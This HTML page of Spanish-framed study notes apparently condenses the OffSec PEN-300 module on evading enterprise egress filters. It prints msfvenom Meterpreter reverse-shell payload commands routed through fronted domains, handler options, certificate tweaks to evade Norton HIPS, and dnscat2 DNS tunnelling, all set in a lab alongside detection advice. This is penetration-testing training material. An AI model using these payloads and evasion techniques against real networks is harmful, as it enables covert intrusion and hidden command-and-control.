@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="es" data-nz-theme="light" data-nz-marca="monocromo">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PEN-300 Module 13 — Bypassing Network Filters — distill</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/tokens.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/marcas/monocromo.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p1-layout.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p2-navigation.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p3-typography.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p4-actions.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p6-feedback.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p8-data.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p17-patrones.css">
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+const mq = matchMedia('(prefers-color-scheme: dark)');
+const saved = localStorage.getItem('nz-theme');
+if (saved === 'dark' || saved === 'light') document.documentElement.dataset.nzTheme = saved;
+else if (mq.matches) document.documentElement.dataset.nzTheme = 'dark';
+mq.addEventListener('change', e => {
+  if (!localStorage.getItem('nz-theme')) document.documentElement.dataset.nzTheme = e.matches ? 'dark' : 'light';
+});
+function nzToggleTheme() {
+  const cur = document.documentElement.dataset.nzTheme === 'dark' ? 'light' : 'dark';
+  document.documentElement.dataset.nzTheme = cur;
+  localStorage.setItem('nz-theme', cur);
+  if (window.nzAfterTheme) nzAfterTheme();
+}
+mermaid.initialize({ startOnLoad: false });
+mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+window.nzAfterTheme = async () => {
+  document.querySelectorAll('.mermaid').forEach(el => {
+    const code = el.getAttribute('data-src') || el.textContent;
+    el.setAttribute('data-src', code);
+    el.removeAttribute('data-processed');
+    el.textContent = code;
+  });
+  mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+  await mermaid.run({ querySelector: '.mermaid' });
+};
+document.addEventListener('DOMContentLoaded', () => {
+  if (document.querySelector('.mermaid')) mermaid.run({ querySelector: '.mermaid' });
+});
+</script>
+<style>
+.nz-prose pre.mermaid { background: none; text-align: center; }
+</style>
+</head>
+<body class="nz">
+<div class="nz-navbar nz-navbar--compact nz-navbar--bordered">
+<span class="nz-navbar__brand"><i></i>Distill</span>
+<span class="nz-navbar__links">
+<a class="nz-navbar__link" href="index.html">Índice</a>
+<a class="nz-navbar__link" href="cat/osep.html">OSEP (PEN-300)</a>
+<button class="nz-btn nz-btn--ghost nz-btn--sm" onclick="nzToggleTheme()" aria-label="Cambiar tema">◐</button>
+</span>
+</div>
+<main class="nz-container" style="padding-block: var(--nz-space-4)">
+<article class="nz-article">
+<header style="margin-bottom:var(--nz-space-4)">
+<p class="nz-eyebrow">Distill · OSEP (PEN-300)</p>
+<h1 class="nz-h2">PEN-300 Module 13 — Bypassing Network Filters</h1>
+<p class="nz-lbl nz-lbl--neutral">Fuente: material del curso correspondiente (sin video público)</p>
+</header>
+<div class="nz-prose">
+<blockquote>
+<p>Distilled from OffSec PEN-300 (OSEP) course material (module: Bypassing Network Filters) — internal training reference, not for redistribution.</p>
+<p>Source notes: distilled from HTML-extracted course pages (not ASR). Known extraction artifacts in the source: every listing is wrapped in doubled/empty code fences, some image-embed markup is mangled (e.g. a stray <code>Advanced" src="" class="internal-embed ..."&gt;</code> fragment), and footnote references collapsed inline into words ("IDSids", "proxyproxy", "deep packet inspection,dpi"). Treat prose as authoritative, re-verify commands against the course pages if in doubt.</p>
+</blockquote>
+<h2>Objective</h2>
+<p>Understand the enterprise Internet Edge egress stack (DNS filters, web proxies, IDS/IPS, SSL inspection, full packet capture) and practice normalization + bypass techniques so C2 traffic "hides within the noise": domain/category hygiene, proxy-aware payloads, certificate customization, domain fronting, and DNS tunneling.</p>
+<h2>Target surface</h2>
+<ul>
+<li>Lab: Windows 10 client (RDP forwarded through the Ubuntu edge box on TCP/3389) behind an Ubuntu edge machine that runs DNS (dnsmasq), Nginx, and Snort (custom drop rules, most defaults disabled).</li>
+<li>Kali attack box: 192.168.119.120. Ubuntu edge/DNS: 172.16.51.21. Windows client: 192.168.120.21 (and 192.168.120.45/46 variants seen in listings).</li>
+<li>Convention: connect to reverse shells by domain name only — direct-to-IP is anomalous and inflexible.</li>
+</ul>
+<h2>Techniques</h2>
+<h3>1. Recon the filter stack yourself</h3>
+<ul>
+<li>DNS filters compare requested domains against blocklists (e.g. malwaredomainlist) or category databases; blocked queries are dropped or sinkholed. Demo: <code>www.internetbadguys.com</code> resolves to a real IP via Google DNS (8.8.8.8 → 67.215.92.210) but to an OpenDNS sinkhole (208.67.222.222 → 146.112.61.108) that serves a "Phishing threat" block page (OpenDNS/Cisco Umbrella).</li>
+<li>Reputation lookups (IPVoid, VirusTotal) aggregate multiple providers; NLP-based filters also judge the domain <em>name itself</em>.</li>
+<li>Web proxies MITM HTTP(S): URL/IP/category filtering, header inspection/modification (User-Agent etc.), full request logging into the SIEM. IDS (passive, alerts) vs IPS (inline, blocks) both do deep packet inspection after reassembling fragmented IP traffic; signatures are narrowly tuned — small pattern changes evade them.</li>
+</ul>
+<h3>2. Domain and IP hygiene (pre-engagement)</h3>
+<ul>
+<li>Avoid "Newly Seen Domain" categorization: register domains well in advance, generate lookups/traffic early, keep spares to swap mid-engagement.</li>
+<li>Pre-populate benign content (e.g. cooking blog) and submit/request categorization via OpenDNS tagging so the domain lands in an allowed category (avoid webmail, etc.). Verify with Symantec Bluecoat/Checkpoint categorization lookups too.</li>
+<li>Typo-squatting (examp1e.com-style) is an option but is itself monitored. Check the C2 IP reputation (shared hosts get flagged for a neighbor's sins) via VirusTotal/IPVoid.</li>
+</ul>
+<h3>3. Payload and proxy normalization</h3>
+<ul>
+<li>Meterpreter's HTTP/S payload is proxy-aware via <code>InternetSetOptionA</code> — prefer payloads that honor local proxy settings.</li>
+<li>Conform to HTTP standards (Windows APIs like <code>HttpOpenRequestA</code> do this naturally) and set <code>HttpUserAgent</code> to a browser/OS combo the org actually uses (sniff it, social-engineer it, or build one at useragentstring.com).</li>
+</ul>
+<h3>4. Signature evasion — case study: Norton/Symantec HIPS</h3>
+<ul>
+<li>Norton 360 HIPS flags the standard Meterpreter HTTPS certificate. Meterpreter already randomizes the cert, but the randomization itself is signatured.</li>
+<li>Fix: generate a custom self-signed cert with controlled field data:
+  <code>kali@kali:~$ openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
+  kali@kali:~$ cat priv.key cert.crt &gt; nasa.pem</code>
+  Set <code>CipherString=DEFAULT</code> (drop <code>@SECLEVEL=2</code>) in <code>/etc/ssl/openssl.cnf</code>, then in multi/handler: <code>set HandlerSSLCert /home/kali/self_cert/nasa.pem</code>. Result: the browser still warns (self-signed) but Norton IPS no longer flags it.</li>
+<li>Alternatives: Metasploit <code>impersonate_ssl</code> (clone a real site's cert metadata) or a genuine Let's Encrypt cert if you own a clean domain.</li>
+<li>Full packet capture devices (Netwitness, Moloch) can't block — goal is a low profile; sanity-check tool traffic in Wireshark and mind C2 geolocation.</li>
+</ul>
+<h3>5. HTTPS inspection</h3>
+<ul>
+<li>Assume inspection if TLS is being decrypted org-wide (org CA impersonates sites). No general bypass; options:</li>
+<li>TLS certificate pinning in Meterpreter: <code>StagerVerifySSLCert true</code> + <code>HandlerSSLCert &lt;pem&gt;</code> — payload aborts if the presented cert hash mismatches.</li>
+<li>Categorize your domain into a privacy-sensitive category (e.g. "banking") that inspection devices typically exempt.</li>
+</ul>
+<h3>6. Domain fronting (Azure CDN demo)</h3>
+<ul>
+<li>Concept: TLS SNI and the HTTP Host header are handled independently. Point SNI at an allowed domain, put your CDN endpoint in the Host header; the CDN routes to your origin. DNS + SNI + cert all show the front domain.</li>
+<li>Azure setup: CDN profile (Standard Verizon tier most reliable; Standard Microsoft breaks TLS/caching), Custom origin = your C2 domain (e.g. meterpreter.info @ 138.68.99.177), endpoint <code>&lt;name&gt;.azureedge.net</code>. Disable caching: Caching behavior "Bypass cache" + "Bypass caching for query strings" (reverse shells aren't static). ~90 min to provision, ~30 min for settings to propagate.</li>
+<li>Test the origin with plain <code>python3 -m http.server 80</code> / an ssl-wrapped SimpleHTTPRequestHandler on 443, then <code>curl</code> / <code>curl -k</code> through the endpoint.</li>
+<li>Find frontable domains with FindFrontableDomains (rvrsh3ll):
+  <code>kali@kali:~$ python3 FindFrontableDomains.py --domain skype.com
+  Azure Frontable domain found: do.skype.com skype-do.azureedge.net.</code>
+  Verify: <code>curl --header "Host: offensive-security.azureedge.net" https://do.skype.com</code>. Wireshark shows DNS for do.skype.com, its CNAME (→ 152.199.19.161), and Microsoft's SAN cert (valid for 99 domains) — Google/Amazon CDNs reject SNI/Host mismatches; Azure (at course time) did not.</li>
+<li>Payload (staged HTTP example):
+  <code>kali@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_http LHOST=do.skype.com LPORT=80 HttpHostHeader=offensive-security.azureedge.net -f exe &gt; http-df.exe</code></li>
+<li>Handler for staged payloads must force the second stage back through the front domain: <code>set OverrideLHOST do.skype.com</code>, <code>set OverrideRequestHost true</code> (plus <code>set HttpHostHeader ...</code>). The "failed to bind to 152.199.19.161" error is expected — Metasploit fails over to 0.0.0.0. Stageless payloads (used below) don't need the Override options.</li>
+</ul>
+<h3>7. Domain fronting in the lab (emulated CDN)</h3>
+<ul>
+<li>Lab emulates a CDN with dnsmasq + Nginx on 172.16.51.21. <code>/etc/hosts</code>: <code>172.16.51.21 good.com</code>, <code>192.168.119.120 bad.com</code> (points at Kali), <code>172.16.51.21 cdn123.offseccdn.com</code>. Nginx vhost for cdn123.offseccdn.com does <code>proxy_pass https://bad.com</code> with <code>proxy_ssl_verify off</code>.</li>
+<li>Snort drops bad.com DNS queries: <code>drop udp any any -&gt; any 53 ... content:"|03|bad|03|com" ...</code> — the <code>|NN|</code> prefixes are length-prefixed FQDN labels (<code>|06|google|03|com</code> for google.com).</li>
+<li>Stageless payload + handler:
+  <code>kali@kali:~$ msfvenom -p windows/x64/meterpreter_reverse_https HttpHostHeader=cdn123.offseccdn.com LHOST=good.com LPORT=443 -f exe &gt; https-df.exe</code></li>
+<li>Verify in Wireshark (filter <code>!(tcp.port == 3389)</code>): DNS resolves good.com, TLS Client Hello SNI requests good.com's cert, Server Hello serves good.com's cert — all while the shell lands via the Host-header-routed path.</li>
+</ul>
+<h3>8. DNS tunneling with dnscat2</h3>
+<ul>
+<li>Prereq: register a domain and set its NS record to your tunnel server so all subdomain queries reach you. Client data rides in subdomain labels (≤63 chars each, FQDN ≤253), server replies ride in record data (A = 4 bytes; TXT up to 64k); clients poll — the server can't initiate. Data is hex-encoded (e.g. <code>617265...</code> = "aretherenewcommands").</li>
+<li>Lab: dnsmasq forwards the tunnel domain to Kali — <code>/etc/dnsmasq.conf</code>:
+  <code>server=/tunnel.com/192.168.119.120
+  server=/somedomain.com/192.168.119.120</code>
+  then <code>sudo systemctl restart dnsmasq</code>.</li>
+<li>Server: <code>kali@kali:~$ dnscat2-server tunnel.com</code> (connections encrypted by default; a pre-shared key can be set — the auto-generated secret in the course listing is [REDACTED]).</li>
+<li>Client (Windows): <code>dnscat2-v0.07-client-win32.exe tunnel.com</code> — compare the "short authentication string" (displayed on both ends) to detect MITM.</li>
+<li>Interactive: <code>session -i 1</code> → <code>shell</code> → <code>session -i 2</code> for a cmd session; TCP tunneling e.g. <code>listen 127.0.0.1:3389 172.16.51.21:3389</code> to RDP over DNS (slow but functional).</li>
+<li>Wireshark shows long, high-entropy subdomains — anomalous, but far less anomalous than a raw command shell.</li>
+</ul>
+<h2>Detection &amp; defense</h2>
+<ul>
+<li>Sinkhole/blocklist DNS + category enforcement catch lazy domains; category services are the first thing a tester games — audit your categorization.</li>
+<li>Proxy logs (Host, URL, User-Agent) are high-signal: alert on non-standard user agents, direct-to-IP HTTP, and protocol deviations (the Cobalt Strike extraneous-space HTTP fingerprint is the canonical example).</li>
+<li>IDS/IPS signatures are brittle — rotate tooling patterns, but defenders should too (Didier Stevens' 2015 Meterpreter POST-URI rule is the template).</li>
+<li>Domain fronting breaks granular CDN filtering; modern CDNs (Google/Amazon, and eventually Azure) reject SNI/Host mismatches — verify what your CDN provider currently allows.</li>
+<li>DNS tunneling is slow but slips most egress controls: monitor DNS for long/label-heavy subdomains, NXDOMAIN bursts, and unusual per-client query volume; restrict which resolvers clients may use.</li>
+</ul>
+<h2>Extra miles &amp; exercises (as given in the module)</h2>
+<ul>
+<li>Use Censys (Shodan-like) to find Azure domain-frontable sites.</li>
+<li>Repeat the lab domain fronting over HTTP with the provided <code>exercise.offseccdn.com</code> Nginx config; try it with PS Empire.</li>
+<li>Tunnel SMB through dnscat2 and reach files on the Windows box via DNS.</li>
+</ul>
+</div>
+<footer class="nz-callout" style="margin-top:var(--nz-space-5)">
+<p class="nz-lbl">Atribución</p>
+<p>Artículo destilado en español a partir de material del curso correspondiente. El análisis y la redacción son propios; las ideas y los datos presentados corresponden a los autores originales.</p>
+</footer>
+</article>
+</main>
+</body>
+</html>
